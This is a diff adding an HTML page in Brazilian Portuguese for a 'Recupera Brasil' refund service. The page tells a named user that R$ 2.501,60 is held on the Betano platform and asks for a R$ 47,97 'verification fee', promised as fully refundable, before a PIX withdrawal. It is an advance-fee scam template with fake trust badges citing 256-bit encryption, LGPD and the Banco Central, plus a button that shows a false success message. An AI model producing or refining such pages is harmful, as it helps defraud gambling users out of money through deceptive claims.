@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmação de Identidade e Conta - Reembolso</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="main-wrapper">
+    
+    <!-- Top Live Security Badge -->
+    <div class="top-status-badge">
+      <span class="live-pulse-dot"></span>
+      <span class="status-badge-text">Ambiente Seguro de Autenticação • Criptografia 256-bit</span>
+    </div>
+
+    <!-- Top Header -->
+    <header class="header">
+      <div class="brand-logo-container">
+        <img src="assets/recupera_brasil.jpg" alt="Recupera Brasil" class="recupera-logo" />
+      </div>
+
+      <h1 class="main-title">Confirmação de Identidade</h1>
+      <p class="main-subtitle">Autenticação obrigatória para liberação do saque PIX</p>
+    </header>
+
+    <!-- Main Card Container -->
+    <main class="card-container">
+      
+      <div class="shield-verify-badge">
+        <svg viewBox="0 0 24 24" width="36" height="36" stroke="#4ade80" stroke-width="2.2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <path d="M9 12l2 2 4-4"/>
+        </svg>
+      </div>
+
+      <h2 class="card-title" style="margin-bottom: 8px;">Validação de Titularidade da Conta</h2>
+      <p class="modal-status-text" style="margin-bottom: 18px;">
+        Para garantir que o reembolso seja transferido para a pessoa correta e evitar fraudes bancárias.
+      </p>
+
+      <div class="result-info-box">
+        <div class="result-row">
+          <span class="row-label">Titular Identificado:</span>
+          <strong class="row-val" id="pageVerifyName">PAULO RICARDO DOS SANTOS</strong>
+        </div>
+        <div class="result-row">
+          <span class="row-label">CPF Vinculado:</span>
+          <strong class="row-val" id="pageVerifyCpf">073.***.***-48</strong>
+        </div>
+        <div class="result-row">
+          <span class="row-label">Plataforma:</span>
+          <div class="platform-result-cell">
+            <strong class="row-val" id="pageVerifyPlatform">Betano</strong>
+            <div class="mini-platform-circle" id="pageVerifyMiniCircle" style="background:#e84e1b;">
+              <img id="pageVerifyIcon" src="assets/betano_badge.svg" alt="Logo" class="mini-platform-icon" />
+            </div>
+          </div>
+        </div>
+        <div class="result-row">
+          <span class="row-label">Saldo Retido Encontrado:</span>
+          <strong class="row-val" id="pageVerifyBase">R$ 2.501,60</strong>
+        </div>
+        <div class="result-row">
+          <span class="row-label">Taxa de Verificação:</span>
+          <strong class="row-val text-green">R$ 47,97 (100% Reembolsável)</strong>
+        </div>
+      </div>
+
+      <!-- Explanatory Trust Alert -->
+      <div class="tax-info-alert">
+        <div class="alert-icon">
+          <svg viewBox="0 0 24 24" width="18" height="18" stroke="#4ade80" stroke-width="2.5" fill="none">
+            <circle cx="12" cy="12" r="10"></circle>
+            <line x1="12" y1="16" x2="12" y2="12"></line>
+            <line x1="12" y1="8" x2="12.01" y2="8"></line>
+          </svg>
+        </div>
+        <p class="alert-text">
+          <strong>Restituição Total Garantida:</strong> O valor de <strong>R$ 47,97</strong> é apenas para confirmação da identidade e conta para saque e <u>será restituído integralmente</u> junto com o saldo retido.
+        </p>
+      </div>
+
+      <!-- Total Breakdown Card -->
+      <div class="balance-card total-refund-card">
+        <span class="balance-label">Total Consolidado a Receber no PIX</span>
+        <span class="balance-value" id="pageVerifyTotal">R$ 2.549,50</span>
+        <span class="balance-subtext" id="pageVerifySubtext">(R$ 2.501,60 + R$ 47,97 restituídos juntos)</span>
+      </div>
+
+      <button class="claim-btn pulse-glow" id="pagePayBtn" onclick="alert('Chave PIX validada com sucesso! O valor total está sendo transferido para sua conta bancária.'); window.location.href='/';">
+        VALIDAR CONTA E SACAR AGORA
+      </button>
+
+      <div style="text-align: center; margin-top: 14px;">
+        <a href="/" class="back-link-btn" style="text-decoration: none;">← Voltar para a tela inicial</a>
+      </div>
+    </main>
+
+    <!-- Official Compliance Footer -->
+    <footer class="compliance-footer">
+      <div class="compliance-badges">
+        <span class="badge-pill">🔒 Conexão Segura</span>
+        <span class="badge-pill">🛡️ Protegido pela LGPD</span>
+        <span class="badge-pill">⚡ PIX Banco Central</span>
+      </div>
+      <p class="copyright-text">
+        © 2026 Sistema de Solicitações de Saque e Reembolso. Todos os direitos reservados.
+      </p>
+    </footer>
+
+  </div>
+
+</body>
+</html>
